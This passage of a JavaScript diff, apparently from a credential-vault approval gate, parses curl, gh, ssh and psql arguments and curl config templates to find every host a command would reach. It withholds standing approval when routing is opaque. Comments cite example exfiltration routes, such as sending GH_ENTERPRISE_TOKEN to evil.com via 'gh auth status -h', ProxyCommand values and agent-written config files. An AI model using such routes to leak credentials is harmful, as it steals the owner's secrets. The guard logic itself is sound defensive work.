+function cfgRouteHosts(key, v) {
+  const t = String(v).trim();
+  if (!t) return { hosts: [] };
+  if (/\{\{|\}\}/.test(t)) return { blind: true };
+  if (key === 'unix-socket' || key === 'abstract-unix-socket') return { blind: true };   // round 23 (MAJOR): a local socket path routes the connection off every named host and cannot be named — BLIND (named, «always» withheld), the same law argv's --unix-socket blinds
+  if (key !== 'url' && key !== 'doh-url' && key !== 'ipfs-gateway' && AUTHORITY_UNSAFE.test(t)) return { blind: true };   // round 24: a byte curl keeps but the parser reads differently, anywhere in a colon form ⇒ blind (url / doh-url / ipfs-gateway route through cfgBareOrUrl → urlParse, which keeps the law per token)
+  let hosts;
+  if (key === 'url') { if (t[0] === '@') return { file: true }; hosts = cfgBareOrUrl(t); }
+  else if (key === 'doh-url' || key === 'ipfs-gateway') hosts = cfgBareOrUrl(t);
+  else if (key === 'connect-to') { const f = colonFields(t); const h = f.length >= 3 ? routeHostOne(f[2]) : null; hosts = h ? [h] : []; }   // HOST1:PORT1:HOST2:PORT2 — curl connects to HOST2 (bracket-aware so an IPv6 [::1] host is not split, and read by the ONE parser)
+  else if (key === 'resolve') { const f = colonFields(t.replace(/^\+/, '')); const h = f[0] ? routeHostOne(f[0]) : null; const addrs = f.slice(2).join(':').split(',').map((a) => routeHostOne(a)).filter(Boolean); hosts = [h, ...addrs].filter(Boolean); }   // [+]HOST:PORT:ADDR[,ADDR] — the mapped host and its address(es), each through the ONE parser
+  else { const h = routeHostOne(t); hosts = h ? [h] : []; }   // proxy / preproxy / proxy1.0 / socks* / dns-servers: [protocol://][user@]host[:port] read exactly as curl reads it (#/? end the authority; a `\` / userinfo-past / unsafe byte blinds)
+  return hosts.length ? { hosts } : { blind: true };   // round 23 (reopens r19 item 1): a NON-empty route token whose host the parser REJECTS is a BLIND authority — named, «always» withheld, never a DROPPED host (curl would still dial it)
+}
+/** round 18/19 (item 3/4): a curl config TEMPLATE the card shows in full can NEST another agent-writable file, ROUTE the connection
+ *  off the URL's host, REDIRECT, or make the destination at run time. Parsed with curl's own grammar (parseCfgLine). Returns
+ *  { reads: 'key value'|null (the FIRST directive that reads/writes a file, routes, redirects or expands — «always» withheld, named),
+ *  hosts: [the route hosts the template names, added to the Hosts line], blind: bool (a {{var}} / opaque route — the destination is
+ *  unknowable) }. The row's category sets are DERIVED from `curl --help all` and pinned by the census (test-vault-run-model). */
+function configNestedFile(text, row) {
+  const short = row.configShort || {};
+  const S = (list) => new Set(list || []);
+  const fileK = S(row.configFileKeys), dataK = S(row.configDataKeys), atNameK = S(row.configAtNameKeys), cookieK = S(row.configCookieKeys),
+    netrcK = S(row.configNetrcKeys), routeK = S(row.configRouteKeys), redirK = S(row.configRedirectKeys), formK = S(row.configFormKeys), expand = row.configExpandPrefix || null;
+  if (![fileK, dataK, atNameK, cookieK, netrcK, routeK, redirK, formK].some((x) => x.size) && !expand) return { reads: null, hosts: [], blind: false };
+  let reads = null, blind = false; const hostsOut = [];
+  const name = (k, v) => { if (!reads) reads = v ? `${k} ${v}` : k; };
+  for (const raw of String(text).split(/\r?\n/)) {
+    const { key, val } = parseCfgLine(raw);
+    if (key == null) continue;
+    const canon = key.length === 1 ? (short[key] || key) : key.toLowerCase();
+    if (expand && canon.startsWith(expand)) { blind = true; name(canon, val); continue; }
+    if (netrcK.has(canon)) { name(canon, ''); continue; }   // --netrc reads ~/.netrc, a file this card cannot show
+    if (redirK.has(canon)) { name(canon, val); continue; }   // --location / --proto-redir: the redirect destination is the server's choice
+    if (routeK.has(canon)) { const r = cfgRouteHosts(canon, val); if (r.blind) { blind = true; name(canon, val); } else if (r.file) { name(canon, val); } else if (r.hosts && r.hosts.length) { hostsOut.push(...r.hosts); name(canon, val); } continue; }
+    if (!val) continue;
+    if (fileK.has(canon)) { name(canon, val); continue; }
+    if (dataK.has(canon) && val[0] === '@' && val !== '@-') { name(canon, val); continue; }   // --data/--header @file reads a file; inline / @- (stdin) / --data-raw do not
+    if (atNameK.has(canon)) { const at = val.indexOf('@'); if (at >= 0 && !val.slice(0, at).includes('=') && val.slice(at + 1) && val.slice(at + 1) !== '-') { name(canon, val); continue; } }   // --variable name@file / --data-urlencode name@file (the @ is not after a `=`)
+    if (cookieK.has(canon) && !val.includes('=')) { name(canon, val); continue; }   // curl -b: a value with `=` is inline cookie data, without it a filename
+    if (formK.has(canon) && /=[@<]/.test(val)) { name(canon, val); continue; }   // -F field=@file (upload) / field=<file (read content)
+  }
+  return { reads, hosts: hostsOut.filter(Boolean), blind };
+}
+/** getopt's short-flag cluster: the first letter that takes a value takes the rest of the word (`-hHOST`, `-sSo out`) or the next word. */
+function shortSplit(a, takes) { for (let i = 1; i < a.length; i++) { const f = '-' + a[i]; if (takes.includes(f)) { let v = i + 1 < a.length ? a.slice(i + 1) : null; if (v && v[0] === '=') v = v.slice(1); return { f, head: a.slice(0, i + 1), v }; } } return null; }   // round 2b: `-s=https://…` (Go flags) drops the `=`
 const HOSTNAME = /^(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,63}$|^localhost$/i;
 
 // ── THE RUN'S DESTINATIONS (lane vault-use-grants round 2 BLOCKER, round 3 completes it) — THE SEAM ──
@@ -534,22 +857,6 @@ function sshTargetHost(p, row, win32 = false) {
 /** A proxy / preproxy / socks value → its authority as the ONE parser reads it: scheme stripped, cut at the first `/`, `?` or
  *  `#` (a `#@host` / `?@host` tail is a fragment/query the tool drops, NEVER userinfo), then host[:port]. (round 5 item 5.) */
 const proxyAuthority = (val) => splitAuthority(schemeOff(String(val == null ? '' : val).trim()).split(/[\/?#]/)[0]);
-const BARE_RE = /^(?:[^\s@\/\\?#]*@)?(\[[0-9a-f:.]+\]|[A-Za-z0-9](?:[A-Za-z0-9.-]{0,251}[A-Za-z0-9])?)?(?::(\d{0,5}))?(?:[\/?#]\S*)?$/i;
-/** A URL tool's bare positional → { host } | { unread:true } (a glob {a,b}/[1-9], or a NUMERIC address not in dotted-quad
- *  form — 2130706433 / 0x7f000001 / 127.1 — which the shape cannot list, so it is blind) | {} (not a target). */
-function targetOf(a) {
-  const s = String(a);
-  if (/[{}]|\[(?![0-9a-f:.]+\])/i.test(s)) return { unread: true };   // curl glob
-  if (/^[a-z][a-z0-9+.-]{0,31}:\/\//i.test(s)) return urlHosts(s).length ? {} : { unread: true };   // scheme://… → the ONE parser
-  const sch = /^([a-z][a-z0-9+.-]*):/i.exec(s);
-  if (sch && CURL_SCHEMES.has(sch[1].toLowerCase())) return { unread: true };   // round 5 item 5: a scheme the tool knows, NOT a clean scheme://host (`ftp:/HOST`, `ftp:HOST`) — curl connects where the bare reader names the SCHEME WORD; BLIND
-  const m = BARE_RE.exec(s);
-  if (!m || (!m[1] && m[2] == null)) return { unread: true };
-  if (!m[1]) return { host: normHost('localhost', m[2] || null) };   // `:3000` = localhost:3000
-  if (/^[\d.]+$/.test(m[1]) && !/^\d{1,3}(?:\.\d{1,3}){3}$/.test(m[1])) return { unread: true };   // a numeric address not dotted-quad ⇒ blind (fail closed)
-  return { host: normHost(m[1], m[2] || null) };
-}
-const httpieTarget = (ps) => (ps.length >= 2 && /^[A-Za-z]+$/.test(ps[0]) ? ps.slice(1, 2) : ps.slice(0, 1));   // `http [METHOD] URL` — the URL, never the method
 /** The hosts the run will CONTACT: `shape.hosts` + every routing/proxy/bare target; `opaque` when one cannot be resolved. */
 function routeTargetsOf(row, kind, hosts, keyed, positionals, plainEnv, win32 = false) {
   const out = new Set(hosts), add = (h, port = null) => { const n = normHost(h, port); if (n) out.add(n); };
@@ -573,8 +880,8 @@ function routeTargetsOf(row, kind, hosts, keyed, positionals, plainEnv, win32 = 
     else if (flag === '-c' || flag === '--config-env') opaque = true;   // git config can set core.sshCommand / http.proxy — opaque
     else if (SSH_OPAQUE_FLAGS.has(flag)) opaque = true;   // round 7 item 1b: ssh -S/-L/-R/-D — DERIVED from SSH_OPT_TABLE, so a short flag and its `-o` long form (SSH_LOCAL_O, the same rows) are opaque together (`-o ControlPath=` ≡ `-S`)
   }
-  if (/^(?:curl|wget)$/.test(row.name)) for (const p of positionals) { const t = targetOf(p); if (t.host) add(t.host); else if (t.unread) opaque = true; }   // every bare positional is a destination; a glob / numeric address is blind
-  else if (/^(?:http|https|httpie)$/.test(row.name)) for (const p of httpieTarget(positionals)) { const t = targetOf(p); if (t.host) add(t.host); else if (t.unread) opaque = true; }
+  if (/^(?:curl|wget)$/.test(row.name)) for (const p of positionals) { const t = targetOf(p, !!row.globs, row.bareHosts === 'all'); if (t.host) add(t.host); else if (t.unread) opaque = true; }   // every bare positional is a destination; a glob / numeric address is blind
+  else if (/^(?:http|https|httpie)$/.test(row.name)) for (const p of httpieTarget(positionals)) { const t = targetOf(p, !!row.globs, row.bareHosts === 'all'); if (t.host) add(t.host); else if (t.unread) opaque = true; }
   // lane vault-use-grants round 5 (BLOCKER item 1): the ssh family's TARGET host is subject to the alias law in EVERY
   // spelling (`sshTargetHost` reads it from a bare `[user@]host`, a `host:path`, or an `ssh://`/`scp://`/`sftp://`/`git+ssh://`
   // URI — r4's rule wrongly exempted every `://` target, reopening `ssh ssh://router`). git: only the REMOTE (positionals[0]);
@@ -593,65 +900,255 @@ function argClassOf(a) {
   if (/[\/\\]|^[.~]/.test(a)) return '<path>';
   return '<word>';
 }
-/** getopt's short-flag cluster: the first letter that takes a value takes the rest of the word (`-xHOST`, `-sxHOST`,
- *  `-oProxyCommand=…`) or the next word (lane vault-use-grants round 3, BLOCKER — an attached value never dodged routeTargetsOf). */
-function shortSplit(a, takes) { for (let i = 1; i < a.length; i++) { const f = '-' + a[i]; if (takes.includes(f)) { let v = i + 1 < a.length ? a.slice(i + 1) : null; if (v && v[0] === '=') v = v.slice(1); return { f, head: a.slice(0, i + 1), v }; } } return null; }
 /** planOf's answer (`run`) → its SHAPE: { v, tool, name, kind, sub, flags, args, hosts, entries, injection, env (NAME=value), keyed,
  *  templates, on, script, known, proxyEnv, always, noAlways, argvExposed }. `always` = «always» may be offered for it. */
 function shapeOf(run) {
-  const row = run.row, kind = run.kind, argv = run.argv, win32 = run.win32 === true;   // round 7 item 1c: the platform where the command RUNS, passed IN (never process.platform read here); the hub is POSIX today, so a drive letter is a host
-  const flags = new Set(), sub = [], args = [], positionals = [], keyed = [];
-  let script = null, afterDashes = false, valueNext = null, configFile = false;
+  const row = run.row, kind = run.kind, argv = run.argv, win32 = run.win32 === true;   // vault-use-grants round 7 item 1c: the platform where the command RUNS, passed IN (int361: kept beside vault-agent-own's shapeOf)
+  const flags = new Set(), sub = [], args = [], positionals = [], keyed = [], valued = [];
+  let script = null, afterDashes = false, valueNext = null, configFile = false, unread = false, gitDriven = false, configOpaque = false;
   const isKeyed = (f) => !!(row && (row.keyed || []).includes(f));
-  const takes = row ? [...(row.valueFlags || []), ...(row.hostFlags || []), ...(row.configFlags || []), ...(row.keyed || [])] : [];   // every flag that consumes a value — so an attached short value (`-xHOST`) is read, and a value flag's value (`-o out.json`) is never a positional host (round 3, item 4)
+  const ghLead = [];   // round 5/6: gh's grammar is PER VERB — collect the LEADING non-dash words (gh wants the command first), stopping at the FIRST dash. A dash before the verb words is a flag the reader cannot place (cobra skips an unknown flag + its arg at every level and re-parses at the leaf), so no key matches ⇒ vg null ⇒ BLIND (fail closed — gh repo -d x edit evil/o/r is not read as repo edit)
+  const ghDepth = row && row.grammar ? gramDepthOf(row.grammar) : 0;   // round 7 (5b): the grammar's longest key, so a 3-word verb (repo autolink create) is matched, not capped at row.sub
+  if (row && row.grammar) for (const a of argv.slice(1)) { if (a[0] === '-' || ghLead.length >= ghDepth) break; ghLead.push(a); }
+  let vg = null;   // the LONGEST leading key the table knows (1 word like `api`, 2 like `repo create`); null = a dash came first, or a verb the table does not carry (one that reaches no host) ⇒ the shape BLINDS below
+  if (row && row.grammar) for (let n = ghLead.length; n >= 1 && !vg; n--) vg = row.grammar[ghLead.slice(0, n).join(' ')] || null;
+  const takes = row ? [...(row.valueFlags || []), ...(row.hostFlags || []), ...(row.configFlags || []), ...(row.keyed || []), ...(vg && vg.value ? vg.value : [])] : [];   // the flags that take a value (+ gh's per-verb value flags)
   if (kind !== 'tool') script = JSON.stringify(argv.slice(1));
   else for (const a of argv.slice(1)) {
     if (!afterDashes && a === '--') { afterDashes = true; flags.add('--'); continue; }
     if (!afterDashes && a.length > 1 && a[0] === '-') {
-      const eq = a.startsWith('--') ? a.indexOf('=') : -1;
-      const cl = a[1] !== '-' && a.length > 2 && !takes.includes(a) ? shortSplit(a, takes) : null;   // -xHOST / -sxHOST / -oProxyCommand=…
-      const f = eq > 0 ? a.slice(0, eq) : cl ? cl.f : a;
+      const eq = a.startsWith('--') ? a.indexOf('=') : -1, cl = a[1] !== '-' && a.length > 2 && !takes.includes(a) ? shortSplit(a, takes) : null;   // round 2: -hHOST, -oProxyCommand=…, -sSo out
+      let f = eq > 0 ? a.slice(0, eq) : cl ? cl.f : a;
       const v = eq > 0 ? a.slice(eq + 1) : cl ? cl.v : null;
+      if (row && row.prefixOpts && f.startsWith('--') && f.length > 2 && !takes.includes(f)) {   // round 2b: GNU/my_getopt accept any UNIQUE prefix of a long option (wget --exec, psql --hos, --comm, --fil)
+        const pref = (list) => (list || []).find((t) => t.startsWith('--') && t !== f && t.startsWith(f));
+        const c = pref(row.configFlags) || pref(row.scriptFlags) || pref(row.hostFlags) || pref(row.keyed) || pref(row.urlFlags) || pref(row.valueFlags);
+        if (c) f = c;   // treat the abbreviation as the flag it names — its value is read (or the shape goes blind) as if spelled in full
+      }
       if (row && (row.configFlags || []).includes(f)) configFile = true;
-      if (v != null) { flags.add(eq > 0 ? a.slice(0, eq + 1) : cl.head); if (isKeyed(f)) keyed.push(`${f}=${v}`); else args.push(argClassOf(v)); } else flags.add(cl ? cl.head : a);
-      valueNext = v == null && (takes.includes(a) || takes.includes(f) || cl) ? f : null;
+      if (row && (row.blindPrefixes || []).some((p) => f.startsWith(p))) unread = true;   // curl --expand-url https://{{H}}/ — a host made at run time
+      if (v != null) { flags.add(eq > 0 ? a.slice(0, eq + 1) : cl.head); if (isKeyed(f)) keyed.push(`${f}=${v}`); else { args.push(argClassOf(v)); valued.push([f, v]); } } else flags.add(cl ? cl.head : a);
+      valueNext = v == null && (takes.includes(a) || takes.includes(f) || cl) ? f : null;   // round 2b: a resolved prefix (f) takes a value too
       continue;
     }
     const wasValue = valueNext; valueNext = null;
     if (wasValue && isKeyed(wasValue)) { keyed.push(`${wasValue}=${a}`); continue; }   // a routing flag's value IS the shape (ssh -o ProxyCommand=…)
-    if (wasValue) { args.push(argClassOf(a)); continue; }   // a value flag's value is NOT a positional (round 3, item 4)
+    if (wasValue) { args.push(argClassOf(a)); valued.push([wasValue, a]); continue; }
     if (row && row.sub && sub.length < row.sub && !positionals.length && /^[a-z][a-z0-9-]{0,40}$/.test(a)) { sub.push(a); continue; }
     args.push(argClassOf(a));
     positionals.push(a);
   }
   // THE HOSTS: every URL anywhere (the command, the plain env values, the templates) + the row's own rules; its defaults when none
   const hosts = new Set([...argv.slice(1), ...run.plainEnv.map((e) => e.value), ...run.files.map((f) => f.text || '')].flatMap(urlHosts));
+  const routeHosts = new Set(), routeWords = [];   // round 14 (MAJOR): ONLY gh's ROUTING inputs — -R/--repo, --hostname, GH_HOST, a spec positional's host — the SEAL's host, distinct from `hosts` (the card's words; a URL in a body/title/template/env value is NOT a routing host)
   if (row && kind === 'tool') {
-    const all = argv.slice(1);
+    const vals = (list) => valued.filter(([f]) => (list || []).includes(f)).map(([, v]) => v).filter((v) => v !== '');   // round 11 (MAJOR 3): an EMPTY value (--head= / -H "" / -R "") is ABSENT — gh falls back (pr create resolves the CWD repo + runs git status over core.fsmonitor; an empty -R uses the CWD remotes), so NO value-flag read counts it as present
+    const envs = (list) => run.plainEnv.filter((e) => (list || []).includes(e.name) && e.value).map((e) => e.value);
+    const many = (v) => String(v).split(',').map((h) => normHost(h.trim()));   // libpq takes a host LIST (PGHOST=h1,h2 · -h h1,h2)
+    if (row.grammar && !vg) unread = true;   // round 6 (FAIL CLOSED): a KNOWN network tool (gh) at a spelling the table cannot read with certainty — a dash before the verb words (findings 1), or a verb the table does not carry: one absent because it reaches no host, or an unknown verb (finding 2) — BLINDS; the reader never models where cobra would place a flag
     if (row.scpLike) for (const a of (row.name === 'git' ? positionals.slice(0, 1) : positionals)) { const m = /^((?:[\w.+-]+@)?)([A-Za-z0-9.-]{1,253}):(?!\/\/)/.exec(a); if (m && !(win32 && !m[1] && /^[A-Za-z]$/.test(m[2]))) hosts.add(normHost(m[2])); }   // git: only the REMOTE (a refspec HEAD:main is never a host); round 7 item 1c: a one-letter `X:path` is a host on POSIX (a Windows drive only on a win32 runner with no `user@`)
     if (row.sshTarget && positionals.length) { const m = /^(?:[\w.+-]+@)?([A-Za-z0-9.-]{1,253})$/.exec(positionals[0]); if (m) hosts.add(normHost(m[1])); }
-    if (row.hostFlags) all.forEach((a, i) => { const eq = a.indexOf('='); if (row.hostFlags.includes(a) && all[i + 1]) hosts.add(normHost(all[i + 1])); else if (eq > 0 && row.hostFlags.includes(a.slice(0, eq))) hosts.add(normHost(a.slice(eq + 1))); });
+    const hostFlagList = [...(row.hostFlags || []), ...(vg && vg.host ? [vg.host] : [])];   // round 5: -h is --hostname only under the verb that defines it (gh auth status -h evil.com sends GH_ENTERPRISE_TOKEN there) — the grammar carries the per-verb short
+    const defHost = (row.hosts || []).find((h) => !/^api\./i.test(h)) || (row.hosts || [])[0] || null;   // round 14: the tool's user-facing default routing host (gh: github.com, not api.github.com) — a 2-part OWNER/REPO routes there
+    if (hostFlagList.length) for (const v of vals(hostFlagList)) { routeWords.push(v); if (!/^[a-z][a-z0-9+.-]{0,31}:\/\//i.test(v)) many(v).forEach((h) => { hosts.add(h); routeHosts.add(h); }); }   // -h x · --host=x · -hx (round 2); a URL value (kubectl -s https://…) is read by the top-level flatMap; round 14: a --hostname is a ROUTING host
+    if (row.scriptFlags) for (const v of vals(row.scriptFlags)) if (row.escapes.test(v)) unread = true;   // round 2: a client's shell escape — where it sends is the shell's
     if (row.registry) for (const a of positionals) { const h = a.split('/')[0]; if (HOSTNAME.test(h.replace(/:\d+$/, ''))) hosts.add(normHost(h)); }
-    if (row.hostEnv) for (const e of run.plainEnv) if ([].concat(row.hostEnv).includes(e.name) && e.value) hosts.add(normHost(e.value));
+    if (row.hostEnv) for (const v of envs(row.hostEnv)) { routeWords.push(v); many(v).forEach((h) => { hosts.add(h); routeHosts.add(h); }); }   // round 14: GH_HOST is a ROUTING host
+    if (row.bareHosts) for (const a of [...(row.bareHosts === 'first' ? httpieTarget(positionals) : positionals), ...vals(row.urlFlags)]) { if (String(a).startsWith('@')) { unread = true; continue; } routeWords.push(a); const t = targetOf(a, !!row.globs, row.bareHosts === 'all'); if (t.host) hosts.add(t.host); if (t.unread) unread = true; }   // round 2b: `--url @file` / `@urls.txt` reads the real targets from a file
+    if (row.conninfo) for (const a of [...argv.slice(1), ...vals(['-d', '--dbname'])]) { conninfoHosts(a).forEach((h) => hosts.add(h)); if (conninfoUriBlind(a)) unread = true; }
+    const repoSpec = vg && vg.spec ? positionals : [];   // round 5/7: a `spec` verb reads EVERY positional (repo view's <repository>, repo create's <name>, issue transfer's SECOND positional <destination-repo>)
+    const repoVals = vg && vg.repoValues ? vals(vg.repoValues) : [];   // round 6/7: every value the help TYPEs OR DESCRIBES as a repository (the inherited -R, repo create --template, issue develop --branch-repo)
+    if (row.repoFlags) for (const v of [...vals(row.repoFlags), ...envs(row.repoEnv), ...repoSpec, ...repoVals]) { routeWords.push(v); const h = repoHostOf(v); if (h) { hosts.add(h); routeHosts.add(h); } else if (h === '') unread = true; else if (/^[A-Za-z0-9._-]+\/[A-Za-z0-9._-]+$/.test(String(v).trim())) routeHosts.add(defHost); }   // round 14: a repo spec's HOST is a ROUTING host (a clean 2-part OWNER/REPO ⇒ the default host)   // round 7 (BLOCKER 2): repoHostOf reads every form go-gh accepts (the scp-like git@HOST:O/R + ssh/https URLs incl.); a 2-part OWNER/REPO ⇒ the default host; a 3-part spec with an unreadable host ⇒ blind
+    if (row.urlArgSubs && row.urlArgSubs.some((b) => b.every((w, i) => ghLead[i] === w))) { const ep = positionals[0]; if (ep != null) { routeWords.push(ep); urlHosts(ep).forEach((h) => routeHosts.add(h)); if (urlHostsBad(ep)) routeHosts.add(null); } }   // a full-URL endpoint is a ROUTE host; a path falls to the default host via the !routeHosts default below (gh api --hostname evil keeps evil only)   // round 15 (MAJOR): gh api <endpoint> — a full-URL positional is the host gh contacts (a ROUTE host); a path routes to the default host
+    if (vg && vg.urlArg) for (const p of positionals) { routeWords.push(p); urlHosts(p).forEach((h) => routeHosts.add(h)); if (urlHostsBad(p)) routeHosts.add(null); }   // round 16 (BLOCKER): a verb whose POSITIONAL may be a URL (`<url>` in its usage — issue view/close/comment, pr view/checks/comment; DERIVED from the live help, never hand-picked) CONTACTS that URL's host — a ROUTE host whatever syntax carries it; a URL host that DIFFERS from the -R / GH_HOST host is TWO route hosts ⇒ the door refuses two_hosts (never sends GH_ENTERPRISE_TOKEN to the URL's host silently)
+    if (row.blindSubs && row.blindSubs.some((b) => b.every((w, i) => sub[i] === w))) { unread = true; gitDriven = true; }   // round 2b: a subcommand that drives git (gh repo clone / pr checkout) — the project's config / hooks decide where it goes
+    if (row.blindFlagSubs) for (const b of row.blindFlagSubs) if (b.sub.every((w, i) => sub[i] === w) && boolFlagOn(argv, b.longs || [], b.shorts || [], vg)) { unread = true; gitDriven = true; }   // round 3/4/5: a verb that drives git only with a bool flag (gh pr merge --delete-branch/-d, repo create --push/--clone/-c) — boolFlagOn matches every pflag spelling (long, =true not =false, a short alone or in a cluster, -x=true); round 5: a cluster's =value binds to the LAST letter only (the grammar says which letters take a value)
+    if (vg && vg.launch && boolFlagOn(argv, vg.launch.filter((f) => f.startsWith('--')), vg.launch.filter((f) => /^-[A-Za-z]$/.test(f)), vg)) unread = true;   // round 10 (BLOCKER 1a): an allowlisted verb with --web/-w or --editor/-e opens a launcher gh resolves from its config file's browser:/editor: key or exec.LookPath on the child's PATH, with the minted value in that program's env — BLIND (the card asks); the launch set is GENERATED per verb from the help and help-hash pinned
+    if (row.needFlagSubs) for (const b of row.needFlagSubs) if (b.sub.every((w, i) => sub[i] === w) && !(vals(b.need).length && (!b.repo || vals(row.repoFlags || []).length || envs(row.repoEnv || []).length))) { unread = true; gitDriven = true; }   // round 10 (MAJOR 2): gh pr create resolves the CWD repo (git status over core.fsmonitor) and PUSHES the head (git push over the repo's pre-push hook / core.hooksPath) UNLESS --head names the branch AND -R (or GH_REPO) names the repo — every other shape BLINDS (gh then touches no local git)
+    if (row.fileFlags) for (const [f, v] of valued) if (row.fileFlags.includes(f) && !fileFlagExempt(f, v, run)) { configFile = true; configOpaque = true; }   // round 17 (item 1): a cert / cookie FILE is opaque — never shown, so «always» stays off even beside a shown config template; round 3/4: a cert / config FILE the agent can write ⇒ config class — blind unless the WHOLE value is a $VAULT_FILE placeholder (fileFlagExempt) for an owner-store entry (a template / an agent-put entry / a substring blinds)
+    if (row.passDashes && flags.has('--')) { unread = true; gitDriven = true; }   // round 2b: gh passes args after `--` to git
+    if ([...argv.slice(1), ...run.plainEnv.map((e) => e.value), ...run.files.map((f) => f.text || '')].some(blindAuthority)) unread = true;   // round 2b (HIGH-1): a URL authority our host read cannot be trusted for
     if (!hosts.size && row.hosts) row.hosts.forEach((h) => hosts.add(h));
+    if (!row.freeText) for (const h of hosts) routeHosts.add(h);   // round 15 (MAJOR): the ONE host set — a tool WITHOUT free-text value flags (every tool but gh) CONTACTS every host it names, so every mentioned host is a route; gh (freeText) carries URLs in --body/--title/templates it never contacts, so its routeHosts is built ONLY from its routing inputs above (-R/--hostname/GH_HOST/a repo spec/gh api <url>)
+    if (!routeHosts.size && defHost) routeHosts.add(defHost);   // when the command names no routing input at all, the tool's default routing host (gh: github.com)
   }
+  if (!(row && kind === 'tool')) for (const h of hosts) routeHosts.add(h);   // round 16 (MAJOR): a tool WITHOUT a row (a shell, an interpreter, an unknown binary) contacts every host it names — the card/audit name it, never «unknown». The freeText rule applies only to rows that declare it (gh)
+  const badHost = routeHosts.has(null);   // round 16 (MINOR): a routing value named a host that did not parse (psql -h ,db.example.com → many() → null); the door refuses bad_host, never lets «sends it to null» reach the verdict
+  routeHosts.delete(null);
   hosts.delete(null);
-  const known = !!row && kind === 'tool';
-  // lane vault-use-grants round 2 (BLOCKER): the DESTINATIONS the run contacts (routing flags, proxies, bare positionals) —
-  // a superset of `hosts`; `routeOpaque` when a routing input cannot be resolved (ProxyCommand, a proxy env var) ⇒ no «always».
-  const dest = routeTargetsOf(row, kind, [...hosts], keyed, positionals, run.plainEnv, win32);
-  if (known && argv.slice(1).some((a) => urlOpaque(a))) dest.opaque = true;   // round 4 (BLOCKER): a URL token in the command whose host the reader cannot be certain of (the backslash/userinfo family) ⇒ opaque
-  const noAlways = kind !== 'tool' ? kind : !known ? 'unknown-destination' : dest.opaque ? 'opaque-route' : !hosts.size ? 'unknown-destination' : row.runsProject ? 'runs-project-code' : configFile ? 'config-file' : run.programWritable ? 'program-writable' : null;
+  const rowHosts = new Set((row && row.hosts) || []);   // round 16 (MINOR): a row's OWN default hosts (gh: api.github.com) are NEVER a «mention» — the row defaults are route hosts; a Mentions line names only a FREE-TEXT host (a --body / --title / template URL) that is not a route
+  const mentions = [...hosts].filter((h) => h && !routeHosts.has(h) && !rowHosts.has(h)).sort();
+  const known = !!row && kind === 'tool';   // round 2: `unread` (a curl glob, a bare number) is part of an UNKNOWN destination — never «always»
+  const cfgVals = row && kind === 'tool' && row.configFlags ? valued.filter(([f]) => row.configFlags.includes(f)).map(([, v]) => v) : [];   // round 17 (item 1): the config-flag values (curl -K / --config …)
+  const configShown = configFile && !configOpaque && cfgVals.length > 0 && cfgVals.every((v) => configTemplateShown(v, run));   // every config value is a $VAULT_FILE template the card renders IN FULL ⇒ the owner sees the agent's ONLY written input ⇒ «always» may be offered (keyed on the template bytes, already in the shape key)
+  let configReads = null;   // round 18/19 (item 3/4): a shown config template whose directives READ a file, ROUTE off the URL's host (url/connect-to/resolve/proxy, scheme-less included), REDIRECT (location/proto-redir) or EXPAND a {{var}} host ⇒ «always» withheld + named; the route hosts it names join the Hosts line, a {{var}} is never a host (blind)
+  if (configShown && row) for (const v of cfgVals) { const mm = /^\$VAULT_FILE\{([^}]*)\}$/.exec(String(v)); const file = mm && run.files.find((x) => x.name === mm[1]); if (file && file.template != null && typeof file.text === 'string') { const d = configNestedFile(file.text, row); if (d.reads && !configReads) configReads = d.reads; for (const h of d.hosts) { hosts.add(h); if (!row.freeText) routeHosts.add(h); } if (d.blind) unread = true; } }
+  const userinfo = !!(row && kind === 'tool') && routeWords.some(urlUserinfo);   // round 18/19 (item 1 + MINOR): a credential-carrying http(s) URL in a ROUTE word (a -R/--repo/--hostname/GH_HOST/GH_REPO value, a repo spec, a gh api/<url> positional, a curl target) ⇒ url_userinfo; judged on route words ONLY — a userinfo URL quoted in a --body / -d body is a mention, never contacted, never refused
+  const bigTpl = run.files.find((f) => f.template != null && typeof f.text === 'string' && bytesOf(f.text) > TEMPLATE_CARD_MAX);   // round 18 (item 2): ANY template (a config flag, a body, a positional, a -d value) past the card render bound ⇒ card_too_long — ONE verdict, never a note that hides it
+  const cardTooLong = bigTpl ? { name: bigTpl.name, template: bigTpl.template, bytes: bytesOf(bigTpl.text) } : null;
+  // int361 (the vault pair — vault-agent-own r23/r25 As-built × vault-use-grants r5): ONE route set. vault-use-grants' routeTargetsOf is the
+  // TOOL-CONTACT reader (curl -x / --proxy1.0 / --connect-to / --resolve / --unix-socket / ssh -J/-W/ProxyCommand / a proxy env var / the ssh
+  // alias law), SEEDED with this shape's own route set — so gh's free-text discipline holds (a --body / --title URL stays a MENTION, r14–r16)
+  // and a shown config template's route directives (r23) are routes; `routeOpaque` withholds «always» (主开发: the opaque rule stands).
+  const dest = routeTargetsOf(row, kind, [...routeHosts], keyed, positionals, run.plainEnv, win32);
+  if (known && argv.slice(1).some((a) => urlOpaque(a))) dest.opaque = true;   // vault-use-grants round 4 (BLOCKER): a URL token whose authority the tool may read past (the blind family) ⇒ opaque
+  const noAlways = kind !== 'tool' ? kind : !known || !hosts.size || unread ? 'unknown-destination' : dest.opaque ? 'opaque-route' : row.runsProject ? 'runs-project-code' : configFile && !(configShown && !configReads) ? 'config-file' : run.programWritable ? 'program-writable' : null;
   return {
-    v: SHAPE_V, tool: run.tool, name: run.name, kind, sub, flags: [...flags].sort(), args, hosts: [...hosts].sort(),
-    routeHosts: dest.hosts.slice().sort(), routeOpaque: dest.opaque,
+    v: SHAPE_V, tool: run.tool, name: run.name, kind, sub, flags: [...flags].sort(), args, hosts: [...hosts].sort(), routeHosts: dest.hosts.slice().sort(), routeOpaque: dest.opaque, mentions, badHost, userinfo, cardTooLong, configReads,
     entries: run.refs.map((r) => r.ref).sort(), injection: [...run.injection].sort(), env: run.plainEnv.map((e) => `${e.name}=${e.value}`).sort(), keyed: keyed.sort(),
     templates: run.files.filter((f) => f.text != null).map((f) => `${f.name}=${f.text}`).sort(), on: run.on || null, script,
-    known, proxyEnv: !!(known && row.proxyEnv), always: !noAlways, noAlways, argvExposed: !!run.argvExposed,
+    known, proxyEnv: !!(known && row.proxyEnv), always: !noAlways, noAlways, argvExposed: !!run.argvExposed, gitDriven,
+    // lane vault-agent-own (the review): where it sends what it reads cannot be told — the raw facts, never `noAlways` (a
+    // known tool naming no host reads 'unknown-destination' there, which hid a config file / a program an agent wrote).
+    // Round 2: every row of KNOWN_TOOLS reaches the network, so a known tool whose host the table did not READ (`curl` with
